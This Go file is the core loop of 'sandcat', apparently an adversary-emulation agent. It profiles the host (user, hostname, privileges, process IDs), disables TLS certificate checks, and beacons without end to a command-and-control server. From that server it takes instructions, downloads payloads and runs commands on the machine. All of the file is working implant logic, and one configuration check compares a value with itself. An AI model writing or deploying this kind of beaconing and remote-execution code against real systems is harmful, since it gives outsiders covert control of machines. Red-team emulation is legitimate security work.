package core

import (
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/user"
	"reflect"
	"runtime"
	"strings"
	"time"
	"path/filepath"

	"../contact"
	"../execute"
	"../util"
	"../output"
	"../privdetect"
)

func runAgent(coms contact.Contact, profile map[string]interface{}) {
	checkin := time.Now()
	for {
		beacon := coms.GetInstructions(profile)
		if len(beacon) != 0 {
			profile["paw"] = beacon["paw"]
			checkin = time.Now()
		} 
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				cmd := cmds.Index(i).Elem().String()
				command := util.Unpack([]byte(cmd))
				output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), profile["paw"].(string))
				go coms.RunInstruction(command, profile, payloads)
				util.Sleep(command["sleep"].(float64))
			}
		} else {
			if len(beacon) > 0 {
				util.Sleep(float64(beacon["sleep"].(int)))
				profile["watchdog"] = beacon["watchdog"].(int)
			} else {
				util.Sleep(float64(15))
			}
			util.EvaluateWatchdog(checkin, profile["watchdog"].(int))
		}
	}
}

func buildProfile(server string, executors []string, privilege string, c2 string) map[string]interface{} {
	host, _ := os.Hostname()
	user, _ := user.Current()

	profile := make(map[string]interface{})
	profile["server"] = server
	profile["host"] = host
	profile["username"] = user.Username
	profile["architecture"] = runtime.GOARCH
	profile["platform"] = runtime.GOOS
	profile["location"] = os.Args[0]
	profile["pid"] = os.Getpid()
	profile["ppid"] = os.Getppid()
	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
	profile["privilege"] = privilege
	profile["exe_name"] = filepath.Base(os.Args[0])
	return profile
}

func chooseCommunicationChannel(profile map[string]interface{}, c2Config map[string]string) contact.Contact {
	coms, _ := contact.CommunicationChannels[c2Config["c2Name"]]
	if !validC2Configuration(coms, c2Config) {
		output.VerbosePrint("[-] Invalid C2 Configuration! Defaulting to HTTP")
		coms, _ = contact.CommunicationChannels["HTTP"]
	}
	return coms
}

func validC2Configuration(coms contact.Contact, c2Config map[string]string) bool {
	if strings.EqualFold(c2Config["c2Name"], c2Config["c2Name"]) {
		if _, valid := contact.CommunicationChannels[c2Config["c2Name"]]; valid {
			return coms.C2RequirementsMet(c2Config)
		}
	}
	return false
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, delay int, executors []string, c2 map[string]string, verbose bool) {
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	privilege := privdetect.Privlevel()
	output.SetVerbose(verbose)
	output.VerbosePrint("Started sandcat in verbose mode.")
	output.VerbosePrint(fmt.Sprintf("server=%s", server))
	output.VerbosePrint(fmt.Sprintf("privilege=%s", privilege))
	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))

	profile := buildProfile(server, executors, privilege, c2["c2Name"])
	util.Sleep(float64(delay))

	for {
		coms := chooseCommunicationChannel(profile, c2)
		if coms != nil {
			for { runAgent(coms, profile) }
		}
		util.Sleep(300)
	}
}
